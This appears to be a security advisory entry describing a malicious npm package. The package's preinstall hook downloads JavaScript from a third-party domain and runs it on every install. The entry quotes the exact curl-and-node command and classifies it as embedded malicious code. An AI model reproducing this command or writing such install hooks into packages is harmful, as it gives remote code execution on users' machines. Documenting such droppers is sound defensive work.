summary: preinstall hook downloads and executes remote JavaScript from third-party domain
details: The package's preinstall lifecycle script in package.json runs `curl https://poc.amanrawat.com/hehe.js -o index.js && node index.js`, fetching unpinned, unauthenticated JavaScript from a personal/PoC domain unrelated to npm or any documented publisher infrastructure and executing it with the installer's privileges on every `npm install`. The remote payload has no integrity check (no hash, no version), is hosted at a mutable URL, and runs automatically before any user code — a textbook install-time remote code execution / dropper pattern. Whoever controls poc.amanrawat.com can deliver arbitrary code to any machine that installs this package.

cwes.description: The product contains code that appears to be malicious in nature.
cwes.name: Embedded Malicious Code
